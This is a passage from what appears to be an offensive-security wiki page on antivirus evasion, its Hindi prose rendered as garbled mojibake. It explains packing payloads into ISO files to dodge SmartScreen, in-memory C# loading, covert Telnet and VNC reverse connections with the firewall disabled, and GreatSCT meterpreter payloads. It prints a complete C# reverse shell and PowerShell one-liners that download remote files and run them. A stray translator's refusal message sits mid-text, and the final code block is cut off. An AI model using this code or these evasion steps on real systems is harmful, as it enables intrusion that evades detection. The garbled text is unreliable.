рдпрд╣ рдзреНрдпрд╛рди рджреЗрдирд╛ рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╣реИ рдХрд┐ **рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп** рд╣рд╕реНрддрд╛рдХреНрд╖рд░ рдкреНрд░рдорд╛рдгрдкрддреНрд░ рдХреЗ рд╕рд╛рде рд╣рд╕реНрддрд╛рдХреНрд╖рд░рд┐рдд рдПрдХреНрдЬреАрдХреНрдпреВрдЯреЗрдмрд▓реНрд╕ **SmartScreen рдХреЛ рдЯреНрд░рд┐рдЧрд░ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреЗ**ред
{% endhint %}

рдЖрдкрдХреЗ рдкреЗрд▓реЛрдбреНрд╕ рдХреЛ Mark of The Web рд╕реЗ рдмрдЪрд╛рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рдкреНрд░рднрд╛рд╡реА рддрд░реАрдХрд╛ рдЙрдиреНрд╣реЗрдВ рдХрд┐рд╕реА рдкреНрд░рдХрд╛рд░ рдХреЗ рдХрдВрдЯреЗрдирд░ рдЬреИрд╕реЗ ISO рдХреЗ рдЕрдВрджрд░ рдкреИрдХреЗрдЬ рдХрд░рдирд╛ рд╣реИред рдРрд╕рд╛ рдЗрд╕рд▓рд┐рдП рд╣реЛрддрд╛ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ Mark-of-the-Web (MOTW) **NTFS рд╡реЙрд▓реНрдпреВрдореНрд╕ рдХреЗ рдЕрд▓рд╛рд╡рд╛** рдХрд┐рд╕реА рднреА рдЕрдиреНрдп рдкрд░ **рд▓рд╛рдЧреВ рдирд╣реАрдВ** рд╣реЛ рд╕рдХрддрд╛ред

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) рдПрдХ рдЙрдкрдХрд░рдг рд╣реИ рдЬреЛ рдкреЗрд▓реЛрдбреНрд╕ рдХреЛ Mark-of-the-Web рд╕реЗ рдмрдЪрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдЙрдЯрдкреБрдЯ рдХрдВрдЯреЗрдирд░реНрд╕ рдореЗрдВ рдкреИрдХреЗрдЬ рдХрд░рддрд╛ рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХрд╛ рдЙрдкрдпреЛрдЧ:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
рдпрд╣рд╛рдБ [PackMyPayload](https://github.com/mgeeky/PackMyPayload/) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ ISO рдлрд╛рдЗрд▓реЛрдВ рдХреЗ рдЕрдВрджрд░ рдкреЗрд▓реЛрдб рдкреИрдХреЗрдЬрд┐рдВрдЧ рджреНрд╡рд╛рд░рд╛ SmartScreen рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рдбреЗрдореЛ рд╣реИред

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## C# рдЕрд╕реЗрдВрдмрд▓реА рд░рд┐рдлреНрд▓реЗрдХреНрд╢рди

C# рдмрд╛рдЗрдирд░реАрдЬ рдХреЛ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рдХрд░рдирд╛ рдХрд╛рдлреА рд╕рдордп рд╕реЗ рдЬрд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдпрд╣ рдЕрднреА рднреА AV рдХреЛ рдкрдХрдбрд╝реЗ рдмрд┐рдирд╛ рдЖрдкрдХреЗ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдЯреВрд▓реНрд╕ рдХреЛ рдЪрд▓рд╛рдиреЗ рдХрд╛ рдПрдХ рдмрд╣реБрдд рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИред

рдЪреВрдВрдХрд┐ рдкреЗрд▓реЛрдб рд╕реАрдзреЗ рдореЗрдореЛрд░реА рдореЗрдВ рд▓реЛрдб рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдмрд┐рдирд╛ рдбрд┐рд╕реНрдХ рдХреЛ рдЫреВрдП, рд╣рдореЗрдВ рдХреЗрд╡рд▓ рдкреВрд░реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рд▓рд┐рдП AMSI рдХреЛ рдкреИрдЪ рдХрд░рдиреЗ рдХреА рдЪрд┐рдВрддрд╛ рдХрд░рдиреА рд╣реЛрдЧреАред

рдЕрдзрд┐рдХрд╛рдВрд╢ C2 рдлреНрд░реЗрдорд╡рд░реНрдХреНрд╕ (sliver, Covenant, metasploit, CobaltStrike, Havoc, рдЖрджрд┐) рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдореЗрдореЛрд░реА рдореЗрдВ рд╕реАрдзреЗ C# рдЕрд╕реЗрдВрдмрд▓реАрдЬ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛ рдкреНрд░рджрд╛рди рдХрд░рддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдРрд╕рд╛ рдХрд░рдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ рд╣реИрдВ:

* **Fork\&Run**

рдЗрд╕рдореЗрдВ **рдПрдХ рдирдпрд╛ рдмрд▓рд┐рджрд╛рдиреА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛**, рдЙрд╕ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЖрдкрдХреЗ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдореИрд▓рд┐рд╢рд╕ рдХреЛрдб рдХреЛ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдирд╛, рдЖрдкрдХреЗ рдореИрд▓рд┐рд╢рд╕ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдФрд░ рдЬрдм рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рдП, рддреЛ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдорд╛рд░рдирд╛ рд╢рд╛рдорд┐рд▓ рд╣реИред рдЗрд╕рдХреЗ рд▓рд╛рдн рдФрд░ рдиреБрдХрд╕рд╛рди рджреЛрдиреЛрдВ рд╣реИрдВред Fork рдФрд░ run рд╡рд┐рдзрд┐ рдХрд╛ рд▓рд╛рдн рдпрд╣ рд╣реИ рдХрд┐ рдирд┐рд╖реНрдкрд╛рджрди рд╣рдорд╛рд░реЗ Beacon рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ **рдмрд╛рд╣рд░** рд╣реЛрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЕрдЧрд░ рд╣рдорд╛рд░реЗ рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдХреБрдЫ рдЧрд▓рдд рд╣реЛрддрд╛ рд╣реИ рдпрд╛ рдкрдХрдбрд╝рд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рд╣рдорд╛рд░реЗ **рдЗрдореНрдкреНрд▓рд╛рдВрдЯ рдХреЗ рдмрдЪрдиреЗ рдХреА** **рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реИред рдиреБрдХрд╕рд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ **Behavioural Detections** рджреНрд╡рд╛рд░рд╛ рдкрдХрдбрд╝реЗ рдЬрд╛рдиреЗ рдХреА **рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реИред

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

рдпрд╣ рдЕрдкрдиреА рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рдореИрд▓рд┐рд╢рд╕ рдХреЛрдб рдХреЛ **рдЕрдкрдиреА рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдореЗрдВ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░рдиреЗ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рд╣реИред рдЗрд╕ рддрд░рд╣, рдЖрдк рдПрдХ рдирдИ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдмрдирд╛рдиреЗ рдФрд░ AV рджреНрд╡рд╛рд░рд╛ рд╕реНрдХреИрди рдХрд┐рдП рдЬрд╛рдиреЗ рд╕реЗ рдмрдЪ рд╕рдХрддреЗ рд╣реИрдВ, рд▓реЗрдХрд┐рди рдиреБрдХрд╕рд╛рди рдпрд╣ рд╣реИ рдХрд┐ рдЕрдЧрд░ рдЖрдкрдХреЗ рдкреЗрд▓реЛрдб рдХреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЗ рд╕рд╛рде рдХреБрдЫ рдЧрд▓рдд рд╣реЛрддрд╛ рд╣реИ, рддреЛ **рдЖрдкрдХреЗ рдмреАрдХрди рдХреЛ рдЦреЛрдиреЗ рдХреА** **рдмрд╣реБрдд рдЕрдзрд┐рдХ рд╕рдВрднрд╛рд╡рдирд╛** рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдпрд╣ рдХреНрд░реИрд╢ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
рдпрджрд┐ рдЖрдк C# рдЕрд╕реЗрдВрдмрд▓реА рд▓реЛрдбрд┐рдВрдЧ рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдФрд░ рдкрдврд╝рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, рддреЛ рдХреГрдкрдпрд╛ рдЗрд╕ рд▓реЗрдЦ рдХреЛ рджреЗрдЦреЗрдВ [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) рдФрд░ рдЙрдирдХреЗ InlineExecute-Assembly BOF ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

рдЖрдк C# рдЕрд╕реЗрдВрдмрд▓реАрдЬ рдХреЛ **PowerShell рд╕реЗ** рднреА рд▓реЛрдб рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) рдФрд░ [S3cur3th1sSh1t рдХрд╛ рд╡реАрдбрд┐рдпреЛ](https://www.youtube.com/watch?v=oe11Q-3Akuk) рджреЗрдЦреЗрдВред

## рдЕрдиреНрдп рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) рдореЗрдВ рдкреНрд░рд╕реНрддрд╛рд╡рд┐рдд рдХреЗ рдЕрдиреБрд╕рд╛рд░, рдЖрдк рд╣рдорд▓рд╛рд╡рд░ рдирд┐рдпрдВрддреНрд░рд┐рдд SMB рд╢реЗрдпрд░ рдкрд░ рд╕реНрдерд╛рдкрд┐рдд рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдорд╢реАрди рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдХрд░ рдЕрдиреНрдп рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдореИрд▓рд┐рд╢рд╕ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

SMB рд╢реЗрдпрд░ рдкрд░ рдЗрдВрдЯрд░рдкреНрд░реЗрдЯрд░ рдмрд╛рдЗрдирд░реАрдЬ рдФрд░ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЛ рдПрдХреНрд╕реЗрд╕ рджреЗрдиреЗ рд╕реЗ рдЖрдк рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП рдорд╢реАрди рдХреА рдореЗрдореЛрд░реА рдХреЗ рднреАрддрд░ рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ **рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред

рд░реЗрдкреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ: Defender рдЕрднреА рднреА рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЛ рд╕реНрдХреИрди рдХрд░рддрд╛ рд╣реИ рд▓реЗрдХрд┐рди Go, Java, PHP рдЖрджрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдореЗрдВ рд╕реНрдЯреЗрдЯрд┐рдХ рд╕рд┐рдЧреНрдиреЗрдЪрд░реНрд╕ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдзрд┐рдХ рд▓рдЪреАрд▓рд╛рдкрди** рдорд┐рд▓рддрд╛ рд╣реИред рдЗрди рднрд╛рд╖рд╛рдУрдВ рдореЗрдВ рдпрд╛рджреГрдЪреНрдЫрд┐рдХ рдЕрди-рдСрдмреНрдлрд╕реНрдХреЗрдЯреЗрдб рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рд╕реНрдХреНрд░рд┐рдкреНрдЯреНрд╕ рдХреЗ рд╕рд╛рде рдкрд░реАрдХреНрд╖рдг рд╕рдлрд▓ рд░рд╣рд╛ рд╣реИред

## рдЙрдиреНрдирдд рдИрд╡реЗрдЬрди

рдИрд╡реЗрдЬрди рдПрдХ рдмрд╣реБрдд рд╣реА рдЬрдЯрд┐рд▓ рд╡рд┐рд╖рдп рд╣реИ, рдХрднреА-рдХрднреА рдЖрдкрдХреЛ рдХреЗрд╡рд▓ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рдореЗрдВ рдХрдИ рдЕрд▓рдЧ-рдЕрд▓рдЧ рд╕реНрд░реЛрддреЛрдВ рдХреЗ рдЯреЗрд▓реАрдореЗрдЯреНрд░реА рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рд░рдЦрдирд╛ рдкрдбрд╝рддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдкрд░рд┐рдкрдХреНрд╡ рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ рдкреВрд░реА рддрд░рд╣ рд╕реЗ рдЕрдкреНрд░рдХрдЯ рд░рд╣рдирд╛ рд▓рдЧрднрдЧ рдЕрд╕рдВрднрд╡ рд╣реИред

рдЖрдк рдЬрд┐рд╕ рднреА рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдЦрд┐рд▓рд╛рдл рдЬрд╛рдПрдВрдЧреЗ, рдЙрдирдХреА рдЕрдкрдиреА рддрд╛рдХрдд рдФрд░ рдХрдордЬреЛрд░рд┐рдпрд╛рдВ рд╣реЛрдВрдЧреАред

рдореИрдВ рдЖрдкрдХреЛ рдЕрдзрд┐рдХ рдЙрдиреНрдирдд рдИрд╡реЗрдЬрди рддрдХрдиреАрдХреЛрдВ рдореЗрдВ рдПрдХ рдкрдХрдбрд╝ рдкрд╛рдиреЗ рдХреЗ рд▓рд┐рдП [@ATTL4S](https://twitter.com/DaniLJ94) рдХреЗ рдЗрд╕ рд╡рд╛рд░реНрддрд╛ рдХреЛ рджреЗрдЦрдиреЗ рдХреА рджреГрдврд╝рддрд╛ рд╕реЗ рд╕рд▓рд╛рд╣ рджреЗрддрд╛ рд╣реВрдБред

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

рдпрд╣ рдИрд╡реЗрдЬрди рдЗрди рдбреЗрдкреНрде рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ [@mariuszbit](https://twitter.com/mariuszbit) рд╕реЗ рдПрдХ рдФрд░ рд╢рд╛рдирджрд╛рд░ рд╡рд╛рд░реНрддрд╛ рднреА рд╣реИред

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **рдкреБрд░рд╛рдиреА рддрдХрдиреАрдХреЗрдВ**

### **Telnet рд╕рд░реНрд╡рд░**

Windows10 рддрдХ, рд╕рднреА Windows рдореЗрдВ рдПрдХ **Telnet рд╕рд░реНрд╡рд░** рдЖрддрд╛ рдерд╛ рдЬрд┐рд╕реЗ рдЖрдк (рдкреНрд░рд╢рд╛рд╕рдХ рдХреЗ рд░реВрдк рдореЗрдВ) рдЗрд╕ рдкреНрд░рдХрд╛рд░ рд╕реНрдерд╛рдкрд┐рдд рдХрд░ рд╕рдХрддреЗ рдереЗ:
```
pkgmgr /iu:"TelnetServer" /quiet
```
рд╕рд┐рд╕реНрдЯрдо рд╢реБрд░реВ рд╣реЛрдиреЗ рдкрд░ рдЗрд╕реЗ **рд╢реБрд░реВ** рдХрд░реЗрдВ рдФрд░ рдЕрднреА рдЗрд╕реЗ **рдЪрд▓рд╛рдПрдВ**:
```
sc config TlntSVR start= auto obj= localsystem
```
**рддреЗрд▓рдиреЗрдЯ рдкреЛрд░реНрдЯ рдмрджрд▓реЗрдВ** (рдЧреБрдкреНрдд) рдФрд░ рдлрд╝рд╛рдпрд░рд╡реЙрд▓ рдЕрдХреНрд╖рдо рдХрд░реЗрдВ:
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (рдЖрдкрдХреЛ bin рдбрд╛рдЙрдирд▓реЛрдбреНрд╕ рдЪрд╛рд╣рд┐рдП, рд╕реЗрдЯрдЕрдк рдирд╣реАрдВ)

**рд╣реЛрд╕реНрдЯ рдкрд░**: _**winvnc.exe**_ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ рдФрд░ рд╕рд░реНрд╡рд░ рдХреЛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░реЗрдВ:

* _Disable TrayIcon_ рд╡рд┐рдХрд▓реНрдк рдХреЛ рд╕рдХреНрд╖рдо рдХрд░реЗрдВ
* _VNC Password_ рдореЗрдВ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ
* _View-Only Password_ рдореЗрдВ рдПрдХ рдкрд╛рд╕рд╡рд░реНрдб рд╕реЗрдЯ рдХрд░реЗрдВ

рдлрд┐рд░, рдмрд╛рдЗрдирд░реА _**winvnc.exe**_ рдФрд░ **рдирд╡рдирд┐рд░реНрдорд┐рдд** рдлрд╝рд╛рдЗрд▓ _**UltraVNC.ini**_ рдХреЛ **рд╢рд┐рдХрд╛рд░** рдХреЗ рдЕрдВрджрд░ рд▓реЗ рдЬрд╛рдПрдБ

#### **рд░рд┐рд╡рд░реНрд╕ рдХрдиреЗрдХреНрд╢рди**

**рд╣рдорд▓рд╛рд╡рд░** рдХреЛ рдЕрдкрдиреЗ **рд╣реЛрд╕реНрдЯ** рдХреЗ рдЕрдВрджрд░ рдмрд╛рдЗрдирд░реА `vncviewer.exe -listen 5900` рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рд╡рд╣ рд░рд┐рд╡рд░реНрд╕ **VNC рдХрдиреЗрдХреНрд╢рди** рдХреЛ рдкрдХрдбрд╝рдиреЗ рдХреЗ рд▓рд┐рдП **рддреИрдпрд╛рд░** рд╣реЛред рдлрд┐рд░, **рд╢рд┐рдХрд╛рд░** рдХреЗ рдЕрдВрджрд░: winvnc рдбреЗрдореЙрди `winvnc.exe -run` рдХреЛ рд╢реБрд░реВ рдХрд░реЗрдВ рдФрд░ `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` рдХреЛ рдЪрд▓рд╛рдПрдБ

**рдЪреЗрддрд╛рд╡рдиреА:** рдЧреБрдкреНрддрддрд╛ рдмрдирд╛рдП рд░рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдкрдХреЛ рдХреБрдЫ рдЪреАрдЬреЗрдВ рдирд╣реАрдВ рдХрд░рдиреА рдЪрд╛рд╣рд┐рдП

* рдЕрдЧрд░ `winvnc` рдкрд╣рд▓реЗ рд╕реЗ рдЪрд▓ рд░рд╣рд╛ рд╣реИ рддреЛ рдЙрд╕реЗ рд╢реБрд░реВ рди рдХрд░реЗрдВ рдирд╣реАрдВ рддреЛ рдЖрдк [рдкреЙрдкрдЕрдк](https://i.imgur.com/1SROTTl.png) рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗред рдЪреЗрдХ рдХрд░реЗрдВ рдХрд┐ рдпрд╣ `tasklist | findstr winvnc` рдХреЗ рд╕рд╛рде рдЪрд▓ рд░рд╣рд╛ рд╣реИ рдпрд╛ рдирд╣реАрдВ
* рдЕрдЧрд░ `UltraVNC.ini` рд╕рдорд╛рди рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдирд╣реАрдВ рд╣реИ рддреЛ `winvnc` рдХреЛ рд╢реБрд░реВ рди рдХрд░реЗрдВ рдирд╣реАрдВ рддреЛ рдпрд╣ [рдХреЙрдиреНрдлрд╝рд┐рдЧ рд╡рд┐рдВрдбреЛ](https://i.imgur.com/rfMQWcf.png) рдЦреЛрд▓ рджреЗрдЧрд╛
* рдорджрдж рдХреЗ рд▓рд┐рдП `winvnc -h` рдХреЛ рдЪрд▓рд╛рдиреЗ рд╕реЗ рдмрдЪреЗрдВ рдирд╣реАрдВ рддреЛ рдЖрдк [рдкреЙрдкрдЕрдк](https://i.imgur.com/oc18wcu.png) рдЯреНрд░рд┐рдЧрд░ рдХрд░реЗрдВрдЧреЗ

### GreatSCT

рдЗрд╕реЗ рдпрд╣рд╛рдБ рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Inside GreatSCT рдХреЗ рдЕрдВрджрд░:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
рдЕрдм `msfconsole -r file.rc` рдХреЗ рд╕рд╛рде **рд▓рд┐рд╕реНрдЯрд░ рд╢реБрд░реВ рдХрд░реЗрдВ** рдФрд░ **xml payload** рдХреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЗ рд╕рд╛рде **рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ**:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**рд╡рд░реНрддрдорд╛рди рдбрд┐рдлреЗрдВрдбрд░ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдмрд╣реБрдд рддреЗрдЬреА рд╕реЗ рд╕рдорд╛рдкреНрдд рдХрд░ рджреЗрдЧрд╛ред**

### рд╣рдорд╛рд░рд╛ рдЕрдкрдирд╛ рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдХрдВрдкрд╛рдЗрд▓ рдХрд░рдирд╛

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### рдкрд╣рд▓рд╛ C# рд░рд┐рд╡рд░реНрд╕рд╢реЗрд▓

рдЗрд╕реЗ рдХрдВрдкрд╛рдЗрд▓ рдХрд░реЗрдВ:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
Since there is no English text that requires translation in the provided content, I cannot provide a Hindi translation. The content consists of a URL and a section heading which are not to be translated as per the instructions. If you have any other text that needs translation, please provide it.
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
рдСрдЯреЛрдореИрдЯрд┐рдХ рдбрд╛рдЙрдирд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрди:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
### C++

C# obfuscators рд╕реВрдЪреА: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
### рдЕрдиреНрдп рдЙрдкрдХрд░рдг
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

